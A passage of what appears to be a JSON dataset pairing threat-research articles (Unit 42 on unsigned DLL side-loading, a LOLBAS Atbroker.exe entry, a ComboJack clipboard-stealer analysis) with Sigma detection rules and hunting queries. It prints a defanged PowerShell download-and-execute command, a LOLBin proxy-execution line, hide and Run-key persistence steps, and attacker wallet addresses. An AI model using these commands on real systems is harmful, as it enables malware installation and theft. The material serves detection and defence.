binaries, threat actors abuse them to achieve code execution in an attempt to evade detection.\n2. DLL order hijacking – This refers to loading a malicious DLL by abusing the search order of a legitimate process. This way, a benign application will load a malicious payload with the name of a known DLL.\n\nReviewing the results of the above techniques in the wild revealed that the most common unprivileged paths to load malicious unsigned DLLs are the folders and sub-folders of ProgramData, AppData and the users’ home directories.\n\nThe next section will introduce several findings based on the above hypothesis.\n\n## Attack Trends in the Wild Related to Unsigned DLLs\n\nTo start hunting based on the hypothesis we described, we created two XQL queries. The first one looks for unsigned DLLs that were loaded by `rundll32.exe/regsvr32.exe`, while the other looks for signed software that loads an unsigned DLL.\n\nThe hunting activity revealed various malware families that used unsigned DLL loading. Figure 1 presents the malware we detected using these methods over the past six months (February-August 2022).\n\n```image\nAlt: Malware observed using DLL loading\nDescription: The image is a bar chart illustrating the attribution of various malware families based on their use of unsigned DLL loading techniques over a six-month period. The chart lists malware names on the vertical axis, such as 'Raspberry Robin,' 'Emotet,' and 'QakBot,' with corresponding percentages indicating their prevalence in relation to the total detections. 'Raspberry Robin' has the highest percentage at 31.0%, followed by 'Emotet' at 17.4% and 'QakBot' at 15.5%. The chart visually represents the distribution of malware families detected using the specified techniques.\nTranscription: |\n  | Attribution      | Percentage |\n  | ---------------- | ---------- |\n  | Raspberry Robin  | 31.0%      |\n  | Emotet           | 17.4%      |\n  | QakBot           | 15.5%      |\n  | IcedID           | 9.7%       |\n  | Cobalt Strike    | 7.8%       |\n  | Vawtrak          | 6.8%       |\n  | Ursnif           | 5.8%       |\n  | Amavaldo         | 3.1%       |\n  | Stately Taurus   | 1.9%       |\n  | Selective Pisces | 1.0%       |\n```\n\n*Figure 1. Malware observed using DLL loading.*\n\nAnalyzing the execution techniques used by the above threats showed that banking trojans and individual threat actors typically used `rundll32.exe` or `regsvr32.exe` to load a malicious DLL, while APT groups used the DLL side-loading technique most of the time.\n\n## Diving Into Selected Payloads\n\n### Stately Taurus\n\nWe decided to highlight an investigation around Stately Taurus activity that we detected in the environment of one organization. Stately Taurus is a Chinese APT group that usually targets non-governmental organizations and is known for abusing legitimate software to load payloads.\n\nIn this case, we observed the usage of the DLL search order hijacking technique that enabled the attacker’s malicious DLL to load into the memory space of a legitimate process. The threat actor used multiple pieces of third party software for the DLL side-loading, such as antivirus software and a PDF reader.\n\n```image\nAlt: AvastSvc.exe uses side-loading to load a malicious DLL.\nDescription: The image displays a detailed analysis of a process, specifically `AvastSvc.exe`, which is involved in DLL side-loading. It includes technical information such as the file path (`C:\\ProgramData\\AvastSvcZEg\\AvastSvc.exe`), user actions, network activities, module details (with a focus on `wsc.dll`), and various hash values (MD5, SHA256). The data also indicates the running time, signature as benign, and the Wildfire score, which suggests the analysis is part of a security investigation into potential malware. This information is relevant for understanding the DLL hijacking technique used by the APT group.\nTranscription: |\n  PATH: C:\\ProgramData\\AvastSvcZEg\\AvastSvc.exe\n  USERNAME:\n  \n  ALL ACTIONS: 12,200 Results\n  NETWORK: 6,067 Results\n  MODULE: 1 Results\n  SYSTEM CALLS: 22 Results\n  NETWORK CONNECTIONS: 6,068 Results\n  \n  RUNNING TIME:\n  MD5: a72036f635cef0dcb1e9c64f9a8fa5b\n  WILDFIRE SCORE: Benign\n  SIGNATURE: Signed by AVAST Software s.r.o.\n  SHA256: 85ca20eeec3400c68a62639a01928a5dab824d2eadf589e5cbfe5a2bc4...\n  CMD: \"C:\\ProgramData\\AvastSvcZEg\\AvastSvc.exe\" 138\n  \n  MODULE_PATH: C:\\ProgramData\\AvastSvcZEg\\wsc.dll\n  MODULE_SIGNATURE_SIGNER:\n  MODULE_SIGNATURE_PRODUCT:\n  MODULE_SIGNATURE: 3\n  MODULE_SHA256: 6491c646397025bf02709f1bd302f512622abd89b550ac38ce6fac938353b594\n```\n\n*Figure 2. `AvastSvc.exe` uses side-loading to load a malicious DLL.*\n\nTo achieve DLL side-loading, the group dropped the payload into the ProgramData folder, which contained three files – a benign EXE file for DLL hijacking (`AvastSvc.exe`), a DLL file (`wsc.dll`) and an encrypted payload (`AvastAuth.dat`). The loaded DLL appeared to be the PlugX RAT, which loads the encrypted payload from the `.dat` file.\n\n```image\nAlt: PlugX files: benign executable, DLL loader and encrypted .dat file.\nDescription: The image is a table displaying file operations related to a malicious DLL side-loading campaign. It includes columns indicating the type of file operation (e.g., File Create, File Write), the names of the files involved (e.g., AvastAuth.dat, wsc.dll, AvastSvc.exe), and the corresponding file paths where these operations occurred (e.g., C:\\ProgramData\\AvastSvcZEg\\AvastAuth.dat). This structured data provides specific insights into the actions taken by the threat actor during the attack.\nTranscription: |\n  | Action      | File Name     | File Path                                |\n  | ----------- | ------------- | ---------------------------------------- |\n  | File Create | AvastAuth.dat | C:\\ProgramData\\AvastSvcZEg\\AvastAuth.dat |\n  | File Write  | wsc.dll       | C:\\ProgramData\\AvastSvcZEg\\wsc.dll       |\n  | File Write  | wsc.dll       | C:\\ProgramData\\AvastSvcZEg\\wsc.dll       |\n  | File Create | wsc.dll       | C:\\ProgramData\\AvastSvcZEg\\wsc.dll       |\n  | File Write  | AvastSvc.exe  | C:\\ProgramData\\AvastSvcZEg\\AvastSvc.exe  |\n```\n\n*Figure 3. PlugX files: benign executable, DLL loader and encrypted .dat file.*\n\n### Selective Pisces\n\nAmong the results of our hunting queries, we also identified several high-entropy malicious modules within the ProgramData directories shown in Figure 4.\n\n```image\nAlt: DLL side-loading by Selective Pisces.\nDescription: The image displays a table summarizing various Action Module Paths associated with a cyber threat analysis. It includes columns for 'ACTION_MODULE_PATH', 'ACTOR_PROCESS_IMAGE_PATH', 'MODULE_ENTROPY', and 'COUNTER'. The paths listed indicate locations of suspicious DLL files and executables within the ProgramData directory, with high entropy values suggesting potential obfuscation or malicious intent. The table format provides a clear and organized way to present key data relevant to the investigation of DLL side-loading techniques utilized by the APT group identified as Selective Pisces.\nTranscription: |\n  | ACTION_MODULE_PATH                            | ACTOR_PROCESS_IMAGE_PATH                               | MODULE_ENTROPY | COUNTER |\n  | --------------------------------------------- | ------------------------------------------------------ | -------------- | ------- |\n  | C:\\ProgramData\\USOShared\\uso.dat              | C:\\ProgramData\\USOShared\\uso.dat                       | 0.999545       | 1       |\n  | C:\\ProgramData\\Microsoft\\Windows\\LfSvc\\mi.dll | C:\\ProgramData\\Microsoft\\Windows\\LfSvc\\wsmporvhost.exe | 0.999396       | 1       |\n  | C:\\ProgramData\\MarkAny\\mi.dll                 | C:\\ProgramData\\MarkAny\\wsmporvhost.exe                 | 0.999393       | 1       |\n  | C:\\ProgramData\\MarkAny\\PrtDAT\\SXSHARED.DLL    | C:\\ProgramData\\MarkAny\\PrtDAT\\dfrgui.exe               | 0.999354       | 1       |\n  | C:\\ProgramData\\USOShared\\USOShared.tmp        | C:\\Windows\\System32\\rundll32.exe                       | 0.999317       | 1       |\n```\n\n*Figure 4. DLL side-loading by Selective Pisces.*\n\nInvestigating the execution chain of the unsigned modules shown in Figure 4 revealed that they were dropped to the disk by the signed DreamSecurity MagicLine4NX process (`MagicLine4NX.exe`).\n\n`MagicLine4NX.exe` executed a second-stage payload that we observed utilizing DLL side-loading in order to evade detection. The second-stage payload wrote a new DLL named `mi.dll`, and copied `wsmprovhost.exe` (host process for WinRM) to a random directory in ProgramData. `Wsmprovhost.exe` is a native Windows binary that attempts to load `mi.dll` from the same directory. The attackers abused this mechanism in order to achieve DLL side-loading (T1574.002) with this process.\n\nThe `mi.dll` payload was observed dropping a new payload named `ualapi.dll` to the System32 directory (`C:\\Windows\\System32\\ualapi.dll`). As `ualapi.dll` is in this case a missing DLL on the System32 directory, the attackers used this fact to achieve persistence by giving their malicious payload the name `ualapi.dll`. That way, `spoolsv.exe` will load it upon startup.\n\nAfter analyzing the payloads above, we attributed them to the North Korean APT group that Unit 42 tracks as Selective Pisces. This group’s utilization of legitimate third party-software such as MagicLine4NX was described earlier this year in a blog post by Symantec.\n\n### Raspberry Robin\n\nThe last attack we would like to elaborate on is the most common one we observed in the wild. Some of the results that our query yields share several common characteristics:\n\n- DLLs with scrambled names reside in random sub-folders of the ProgramData or AppData folders.\n- Those DLLs have a similar range of entropy (~0.66).\n- All of them were loaded by `rundll32.exe` or `regsvr32.exe`.\n\nFor example:\n`RUNDLL32.EXE C:\\ProgramData\\<random_folder>\\fhcplow_Tudjdm.dll,iarws_sbv`\n\n```image\nAlt: DLLs loaded by Raspberry Robin.\nDescription: The image is a table displaying data related to DLL (Dynamic Link Library) files associated with the Raspberry Robin attack. It includes columns for 'ACTION_MODULE_PATH', which lists various file paths where the DLLs are located, 'MODULE_ENTROPY', indicating the entropy values of these files, and 'COUNTER', which shows the frequency of each DLL's occurrence. The paths include various subdirectories within 'ProgramData' and 'AppData', highlighting the locations where potentially malicious DLLs are found. The entropy values are relatively low, suggesting they may be deliberately obfuscated.\nTranscription: |\n  | ACTION_MODULE_PATH                                                                | MODULE_ENTROPY | COUNTER |\n  | --------------------------------------------------------------------------------- | -------------- | ------- |\n  | C:\\ProgramData\\FunctionApplication\\LicenseProcess\\npwmsе_Nemcttdid.dll            | 0.662609       | 26      |\n  | C:\\ProgramData\\DirectoryStarted\\ProteteiinDirect\\iyclBaiic_fig.dll                | 0.665728       | 8       |\n  | C:\\Users\\<redacted>\\AppData\\Local\\MediumInput\\SenurJuеst\\Portsoft_Gdfv.dll        | 0.665709       | 2       |\n  | C:\\ProgramData\\PagesSetup\\SsndZets\\adlsoft_w_ni.dll                               | 0.667337       | 12      |\n  | C:\\ProgramData\\FeatureAnimation\\Trqzelbternet\\dfjssоft_002.dll                    | 0.663264       | 6       |\n  | C:\\Users\\<redacted>\\AppData\\Local\\VeryRegister\\FiltewsSchedule\\fhcplow_Tudjdm.dll | 0.669195       | 8       |\n  | C:\\Users\\<redacted>\\AppData\\Local\\AccountsAssets\\BasicKpph\\CNBERngs_De4_3.dll     | 0.667706       | 2       |\n```\n\n*Figure 5. DLLs loaded by Raspberry Robin.*\n\nThe DLL loading activities that take place in those attacks were attributed to a campaign called Raspberry Robin, which was recently described by Red Canary.\n\nThose attacks begin from a shortcut file on an infected USB device. This spawns `msiexec.exe` to retrieve the malicious DLL from a remote C2 server. Over installation, a scheduled task is created in order to achieve persistence, loading the DLL using `rundll32.exe/regsvr32.exe` on system start up.\n\n## Using Unsigned DLLs to Hunt for Attacks in Your Environment\n\nYou can hunt for the loading of unsigned DLLs using XQL Search in Cortex XDR. To narrow down the results, we suggest focusing on the following:\n\n- For DLL side-loading, we recommend paying attention to known third-party software placed in non-standard directories.\n- Focus on the file’s entropy – binaries that have a high value of entropy may contain a packed section that will be extracted during execution.\n- Focus on the frequency of execution – high-frequency results may indicate a legitimate activity that occurs periodically, while low-frequency results may be a lead for an investigation.\n- Focus on the file’s path – results that contain folders or files with scrambled names are more suspicious than others.\n\n```image\nAlt: Query results sorted by the module's entropy.\nDescription: The image displays a table of query results related to unsigned DLLs, sorted by module entropy. Each row shows various attributes including the SHA256 hash of the action module, its file path, the module's entropy value, and a counter indicating the frequency of execution. The data highlights potential malicious activity, differentiating between suspected Emotet executions and benign DLLs based on their entropy values.\nTranscription: |\n  | ACTION_MODULE_SHA256                                            | ACTION_MODULE_PATH                                                                      | MODULE_ENTROPY | COUNTER |\n  | --------------------------------------------------------------- | --------------------------------------------------------------------------------------- | -------------- | ------- |\n  | 45a9b070cf4c167299776ab84ecbf675559592e261aa1449dcba068831f5224 | C:\\Users\\...\\AppData\\Local\\Avwulrcoqgev\\gzwdmbhfz.lqa                                   | 0.860774       | 1       |\n  | 3647c1b0d158ad58b04484173712e13f17ea4b9c7015cb40c9840c44819b2d  | C:\\Users\\...\\AppData\\Local\\Avwulrcoqgev\\gzwdmbhfz.lqa                                   | 0.802315       | 1       |\n  | a6fbd79ce5ab32a93f3fc92e96cd78225e0f830857c96da985df1c4c16      | C:\\Users\\...\\AppData\\Roaming\\Highspot\\OutlookAddin64.dll                                | 0.773056       | 2       |\n  | ed2e9f64df54f0a93ec3fd2e5c19fe004a61803b4c6b93d028f4985a599     | C:\\ProgramData\\Autodesk\\ApplicationPlugins\\VRay3dsMax2022\\bin\\ChaosThumbnailHandler.dll | 0.737689       | 3       |\n  | 095e49ae5611b78a76c7af5e4e2395eb0056e246f5002fddc0053302a918d9  | C:\\Users\\...\\AppData\\Roaming\\Citrix\\SelfService\\Chooseanapplication.exe                 | 0.637715       | 1       |\n```\n\n*Figure 6. Query results sorted by the module’s entropy.*\n\nFigure 6 contains partial results of the queries that are mentioned in the next section, sorted by the module’s entropy. While the first two rows are an example of Emotet execution, the others are benign DLLs.\n\n### Hunting Queries\n\n```\n// Rundll32.exe / Regsvr32.exe loads an unsigned module from uncommon folders over the past 30 days.\nconfig case_sensitive = false\ntimeframe = 30d\n| dataset = xdr_data\n| filter event_type = ENUM.LOAD_IMAGE and (action_module_path contains \"C:\\ProgramData\" or action_module_path contains \"\\public\" or action_module_path contains \"\\documents\" or action_module_path contains \"\\pictures\" or action_module_path contains \"\\videos\" or action_module_path contains \"appdata\")\n| alter module_entropy = json_extract_scalar(action_module_file_info, \"$.entropy\")\n| fields agent_hostname, action_module_sha256, action_module_path, actor_process_image_name, actor_process_command_line, module_entropy\n| comp count(action_module_path) as counter by action_module_path, action_module_sha256, module_entropy\n```\n\n```\n// Possible DLL side-loading - a signed process loaded an unsigned DLL from AppData\\ProgramData\\Public folder over the past 30 days\nconfig case_sensitive = false\ntimeframe = 30d\n| dataset = xdr_data\n| filter event_type = ENUM.LOAD_IMAGE and action_module_signature_status = 3 and (actor_process_image_name not contains \"rundll32.exe\" or actor_process_image_name not contains \"regsvr32.exe\") and (actor_process_image_path contains \"appdata\" or actor_process_image_path contains \"programdata\" or actor_process_image_path contains \"public\")\n| alter module_entropy = json_extract_scalar(action_module_file_info, \"$.entropy\")\n| fields agent_hostname, action_module_sha256, action_module_path, actor_process_image_name, actor_process_command_line, module_entropy\n| comp count(action_module_path) as counter by action_module_path, action_module_sha256, module_entropy\n```\n\n## Conclusion\n\nMost detection techniques for blocking malicious DLLs rely on the module's behavior after it has been loaded into memory. This can limit the ability to block all malicious modules.\n\nThat said, you can proactively hunt for malicious unsigned DLLs using hunting approaches such as the ones presented in this blog.\n\nKnowing the baseline of your network in terms of legitimate software or behavior can reduce the number of results generated by the above queries, allowing you to focus on results that might be suspicious.\n\nCortex XDR alerts on and blocks malicious DLLs loaded by known hijacking techniques, and can also prevent post-exploitation activities, through the Behavioral Threat Protection and Analytics modules.\n\nIndicators of compromise and TTPs associated with Stately Taurus can be found in the Stately Taurus ATOM.\n\nIf you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200.\n\n## Indicators of Compromise\n\n| Threat Actor     | SHA256                                                             |\n| ---------------- | ------------------------------------------------------------------ |\n| Selective Pisces | `779a6772d4d35e1b0018a03b75cc6f992d79511321def35956f485debedf1493` |\n| Selective Pisces | `d9b1ad70c0a043d034f8eecd55a8290160227ea66780ccc65d0ffb2ebc2fb787` |\n| Selective Pisces | `3131985fa7394fa9dbd9c9b26e15ac478a438a57617f1567dc32c35b388c2f60` |\n| Selective Pisces | `5be717dc9eda4df099e090f2a59c25372d6775e7d6551b21f385cf372247c2fd` |\n| Selective Pisces | `18cc18d02742da3fa88fc8c45fe915d58abb52d3183b270c0f84ae5ff68cf8a2` |\n| Selective Pisces | `7aa62af5a55022fd89b3f0c025ea508128a03aab5bc7f92787b30a3e9bc5c6e4` |\n| Selective Pisces | `79b7964bde948b70a7c3869d34fe5d5205e6259d77d9ac7451727d68a751aa7d` |\n| Selective Pisces | `cf9ccba037f807c5be523528ed25cee7fbe4733ec19189e393d17f92e76ffccc` |\n| Selective Pisces | `32449fd81cc4f85213ed791478ec941075ff95bb544ba64fa08550dd8af77b69` |\n| Selective Pisces | `5a8b1f003ae566a8e443623a18c1f1027ec46463c5c5b413c48d91ca1181dbf7` |\n| Selective Pisces | `5bb4950a05a46f7d377a3a8483484222a8ff59eafdf34460c4b1186984354cf9` |\n| Stately Taurus   | `352fb4985fdd150d251ff9e20ca14023eab4f2888e481cbd8370c4ed40cfbb9a` |\n| Stately Taurus   | `6491c646397025bf02709f1bd3025f1622abdc89b550ac38ce6fac938353b954` |\n| Stately Taurus   | `e8f55d0f327fd1d5f26428b890ef7fe878e135d494acda24ef01c695a2e9136d` |\n| Raspberry Robin  | `06f11ea2d7d566e33ed414993da00ac205793af6851a2d6f809ff845a2b39f57` |\n| Raspberry Robin  | `202dab603585f600dbd884cb5bd5bf010d66cab9133b323c50b050cc1d6a1795` |\n| Raspberry Robin  | `f9e4627733e034cfc1c589afd2f6558a158a349290c9ea772d338c38d5a02f0e` |\n| Raspberry Robin  | `9fad2f59737721c26fc2a125e18dd67b92493a1220a8bbda91e073c0441437a9` |\n| Raspberry Robin  | `9973045c0489a0382db84aef6356414ef29814334ecbf6639f55c3bec4f8738f` |\n\n*Table 1. Hashes of samples.*\n\n## Tags\n\n- Advanced Persistent Threat\n- DLL Sideloading\n- Investigation and Response\n- Lazarus Group\n- Malware Prevention\n- Mustang Panda\n- PKPLUG\n- Selective Pisces\n- Stately Taurus\n- Threat intelligence",
    "sigma_rule": {
      "title": "Unsigned DLL Loaded by Windows Utility",
      "id": "b5de0c9a-6f19-43e0-af4e-55ad01f550af",
      "status": "test",
      "description": "Detects windows utilities loading an unsigned or untrusted DLL.\nAdversaries often abuse those programs to proxy execution of malicious code.\n",
      "references": [
        "https://www.elastic.co/security-labs/Hunting-for-Suspicious-Windows-Libraries-for-Execution-and-Evasion",
        "https://akhere.hashnode.dev/hunting-unsigned-dlls-using-kql",
        "https://unit42.paloaltonetworks.com/unsigned-dlls/?web_view=true"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-02-28",
      "modified": "2024-03-07",
      "tags": [
        "attack.t1218.011",
        "attack.t1218.010",
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "image_load"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\InstallUtil.exe",
            "\\RegAsm.exe",
            "\\RegSvcs.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe"
          ]
        },
        "filter_main_signed": {
          "Signed": "true"
        },
        "filter_main_sig_status": {
          "SignatureStatus": [
            "errorChaining",
            "errorCode_endpoint",
            "errorExpired",
            "trusted"
          ]
        },
        "filter_main_signed_null": {
          "Signed": null
        },
        "filter_main_signed_empty": {
          "Signed": [
            "",
            "-"
          ]
        },
        "filter_main_sig_status_null": {
          "SignatureStatus": null
        },
        "filter_main_sig_status_empty": {
          "SignatureStatus": [
            "",
            "-"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_unsigned_dll.yml",
    "id": "56"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Atbroker/",
    "markdown": "# /Atbroker.exe\n\n## Execute\n- Execute\n\nHelper binary for Assistive Technology (AT)\n\n### Paths:\n- C:\\Windows\\System32\\Atbroker.exe\n- C:\\Windows\\SysWOW64\\Atbroker.exe\n\n### Resources:\n- http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/\n\n### Detections:\n- Sigma: proc_creation_win_lolbin_susp_atbroker.yml\n- Sigma: registry_event_susp_atbroker_change.yml\n- IOC: Changes to HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\Configuration\n- IOC: Changes to HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\n- IOC: Unknown AT starting C:\\Windows\\System32\\ATBroker.exe /start malware\n\n## Execute\n1. Start a registered Assistive Technology (AT).\n   ```\n   ATBroker.exe /start malware\n   ```\n   - **Use case**: Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry.\n   - **Privileges required**: User\n   - **Operating systems**: Windows 8, Windows 8.1, Windows 10, Windows 11\n   - **ATT&CK® technique**: T1218: System Binary Proxy Execution",
    "sigma_rule": {
      "title": "Uncommon  Assistive Technology Applications Execution Via AtBroker.EXE",
      "id": "f24bcaea-0cd1-11eb-adc1-0242ac120002",
      "status": "test",
      "description": "Detects the start of a non built-in assistive technology applications via \"Atbroker.EXE\".",
      "references": [
        "http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/",
        "https://lolbas-project.github.io/lolbas/Binaries/Atbroker/"
      ],
      "author": "Mateusz Wydra, oscd.community",
      "date": "2020-10-12",
      "modified": "2024-03-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\AtBroker.exe"
          },
          {
            "OriginalFileName": "AtBroker.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "start"
        },
        "filter_main_builtin": {
          "CommandLine|contains": [
            "animations",
            "audiodescription",
            "caretbrowsing",
            "caretwidth",
            "colorfiltering",
            "cursorindicator",
            "cursorscheme",
            "filterkeys",
            "focusborderheight",
            "focusborderwidth",
            "highcontrast",
            "keyboardcues",
            "keyboardpref",
            "livecaptions",
            "magnifierpane",
            "messageduration",
            "minimumhitradius",
            "mousekeys",
            "Narrator",
            "osk",
            "overlappedcontent",
            "showsounds",
            "soundsentry",
            "speechreco",
            "stickykeys",
            "togglekeys",
            "voiceaccess",
            "windowarranging",
            "windowtracking",
            "windowtrackingtimeout",
            "windowtrackingzorder"
          ]
        },
        "filter_optional_java": {
          "CommandLine|contains": "Oracle_JavaAccessBridge"
        },
        "condition": "all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate, non-default assistive technology applications execution"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_atbroker_uncommon_ats_execution.yml",
    "id": "59"
  },
  {
    "url": "https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/",
    "markdown": "# Sure, I’ll take that! New ComboJack Malware Alters Clipboards to Steal Cryptocurrency\n\n**Malware**\n**Related Products**: [Advanced WildFire](https://unit42.paloaltonetworks.com/product-category/advanced-wildfire/)\n**Published:** March 5, 2018\n**Categories:**\n- Cybercrime\n- Malware\n- Threat Research\n**Tags:**\n- ComboJack\n- Cryptocurrency\n- Cryptoshuffler\n- CVE-2017-8579\n\n---\n\n## Summary\n\nUnit 42 researchers have discovered a new currency stealer targeting cryptocurrencies and online wallets. \"ComboJack\" replaces clipboard addresses with an attacker-controlled address, sending funds to the attacker's wallet. This technique relies on victims not checking the destination wallet before finalizing a transaction. In 2017, CryptoShuffler was the first malware to use this tactic. ComboJack targets a range of cryptocurrencies and digital currencies such as WebMoney and Yandex Money.\n\n## Details\n\nOn February 25, 2018, Unit 42 and Proofpoint researchers observed a malspam campaign targeting Japanese and American users. The campaign claimed a passport was lost, and the attached PDF contained a scanned copy of the document.\n\n\n\n*Image 1. Example malspam received by users.*\n\nUsers opening this PDF would find a single line of text referring to an embedded doc file.\n\n```image\nAlt: Combojack_2\nDescription: The image displays a prompt from a PDF document indicating that it embeds a file named 'Achi1.doc.' The message warns the user that the embedded file may contain harmful programs, macros, or viruses and asks whether they would like to open the file. The options provided include 'Open this file,' 'Always allow opening files of this type,' and 'Never allow opening files of this type.' This prompt illustrates a potential security risk associated with opening embedded files in documents, aligning with the context of malware distribution discussed in the provided text.\nTranscription: |\n  This PDF document embeds file Achi1.doc\n  \n  Open File\n  \n  The file 'Achi1.doc' may contain programs, macros, or viruses that could potentially harm your computer. Open the file only if you are sure it is safe. Would you like to:\n  \n  ( ) Open this file\n  ( ) Always allow opening files of this type\n  ( ) Never allow opening files of this type\n  \n  [ OK ] [ Cancel ]\n```\n\n*Figure 1. Prompt displayed to the victim when opening the embedded RTF file.*\n\nThe PDF contained an embedded RTF file with a remote object that attacks CVE-2017-8579, as discussed in this FireEye report. The remote object is an HTA file located at `hXXps://a.doko[.]moe/tnejln`, containing encoded PowerShell commands.\n\n```image\nAlt: ComboJackImage2\nDescription: The image depicts a snippet of obfuscated JavaScript code, likely used in a malicious context. The code includes references to creating a COM object, reversing character strings, and executing PowerShell commands. It suggests that this code is part of the ComboJack malware, which alters clipboards to steal cryptocurrency by executing a downloaded executable file.\nTranscription: |\n  html\n  <!DOCTYPE html>\n  <meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE8\" >\n  <html>\n  <body>\n  <ScRiPt LANgUAgE=\"vbscriPtscript>\n```\n\n*Image 2. Contents of the HTA file retrieved from hXXps://a.doko[.]moe/tnejln.*\n\nDecoding the HTA file yields the following PowerShell command, which downloads and executes a file:\n\n```\nwscript.shell %systemroot%\\system32\\windowspowershell\\v1.0\\powershell.exe (new-object system.net.webclient).downloadfile(hXXp://masolo[.]win/protect/achi.exe $env:appdata\\bstest.exe) ; start $env:appdata\\bstest.exe\n```\n\nThe full flow of execution can be visualized as follows:\n\n```image\nAlt: Combojack_3\nDescription: The image illustrates the flow of execution in a malware attack involving ComboJack. It depicts a series of steps that a victim goes through: receiving a malicious email, opening a PDF attachment, loading an embedded RTF file, which then exploits a vulnerability to run a PowerShell script that downloads and executes the ComboJack malware on the victim's machine. Each step is represented with graphic icons indicating the actions taken.\nTranscription: The image illustrates the flow of execution in a malware attack involving ComboJack. It depicts a series of steps that a victim goes through: receiving a malicious email, opening a PDF attachment, loading an embedded RTF file, which then exploits a vulnerability to run a PowerShell script that downloads and executes the ComboJack malware on the victim's machine. Each step is represented with graphic icons indicating the actions taken.\n```\n\n*Figure 2. Flow of execution leading to ComboJack being installed on the victim.*\n\n---\n\n## ComboJack\n\nThe following files were used for this analysis:\n\n| **File**      | **SHA256**                                                       |\n| ------------- | ---------------------------------------------------------------- |\n| Initial File  | 9613aefc12880528040812b0ce9d3827d1c25fe66f8598eaef82c169e8ed02da |\n| Second Stage  | cab010b59cf9d649106477df012ca49f939aa537910b56bfadbe1381b0484d88 |\n| Final Payload | 05dfde82a9790943df8dfab6b690ec18711ce3558f027dd74504b125d24d6136 |\n\nThe initially downloaded file is a self-extracting executable (SFX) with embedded commands for extracting the second stage. The second stage is a password-protected SFX, but the password is supplied by the first stage. The “setup.txt” from the first stage contains the following:\n\n```image\nAlt: Combojack_4\nDescription: The image contains a screenshot of a configuration file, likely related to the ComboJack malware analysis. It shows various lines of code indicating settings for executable files, such as paths, silent installation options, overwrite permissions, and update flags. The highlighted setups include 'NVDisplay.Container.exe' and another executable with a unique identifier. This file is part of the malware's setup process, detailing how it operates silently on the infected machine.\nTranscription: |\n  Path=%Temp%\n  Setup=NVDisplay.Container.exe\n  Silent=1\n  Overwrite=1\n  Update=U\n  Path=%Temp%\n  Setup=RyODwdjId0q7.exe -pDilouooYyyfZ\n  Silent=1\n  Overwrite=1\n  Update=U\n```\n\n*Image 3. Contents of setup.txt embedded in the first SFX layer of the payload.*\n\nOnce ComboJack is extracted, it copies itself to:\n\n```\nC:\\\\ProgramData\\\\NVIDIA\\\\NVDisplay.Container.exe\n```\n\nIt then uses `attrib.exe` to set hidden and system attributes to itself, hiding the file from the user and allowing it to execute with SYSTEM-level privileges:\n\n```\ncmd /k attrib +s +h \"C:\\\\ProgramData\\\\NVIDIA\\\\NVDisplay.Container.exe\"\n```\n\nFinally, the payload sets the following registry key to ensure persistence:\n\n```\nHKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\NVIDIA – C:\\\\ProgramData\\\\NVIDIA\\\\NVDisplay.Container.exe\n```\n\nComboJack enters an infinite loop, checking the clipboard every half second for wallet information. If a wallet of interest is found, ComboJack replaces it with a hardcoded wallet address. The replacement criteria are as follows:\n\n| **Criteria**                        | **Replaces with**                                  | **Wallet Type**           |\n| ----------------------------------- | -------------------------------------------------- | ------------------------- |\n| Length of 42 and starts with ‘0’    | 0xE44598AB74425450692F7b3a9f898119968da8Ad         | Ethereum                  |\n| Length of 106 and starts with ‘4’   | 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBE | Monero (incorrect length) |\n| Length of 34 and starts with ‘1’    | 1LGskAycxvcgh6iAoigcvbwTtFjSfdod2x                 | Bitcoin                   |\n| Length of 34 and starts with ‘L’    | LYB56d6TeMg6VmahcgfTZSALAQRcNRQUV                  | Litecoin                  |\n| Length of 11 and starts with ‘8’    | 79965017478                                        | Qiwi                      |\n| Length of 13 and starts with ‘R’    | R064565691369                                      | WebMoney (Rubles)         |\n| Length of 13 and starts with ‘Z’    | Z152913748562                                      | WebMoney (USD)            |\n| Length of 13 and starts with ‘E’    | 88888888888888888888888888888888888888888888888888 | Unknown                   |\n| Length of 15 and starts with ‘4100’ | 410014474125403                                    | Yandex Money              |\n\n*Table 1. Replacement address lookup table hardcoded into ComboJack.*\n\n---\n\n## Conclusion\n\nWith the rise of Cryptomining malware, some actors are taking a different route to acquiring web-based currency. ComboJack targets multiple cryptocurrencies and web-based wallets, hedging bets on which currency will boom. As cryptocurrency prices rise, more malware targeting cryptocurrencies is expected.\n\nPalo Alto Networks WildFire customers are protected from this threat through the following:\n\n- ComboJack malware is identified as malicious and blocked via the Traps and WildFire products.\n- Customers can monitor and track ComboJack through the AutoFocus tag.\n\n---\n\n## IOCs\n\n**Lure PDFs:**\n\n- dd8ba88df50de86e7bb9b6343313e48e1e3b8d1a84ffca0a06a203a2f027cfdc\n- 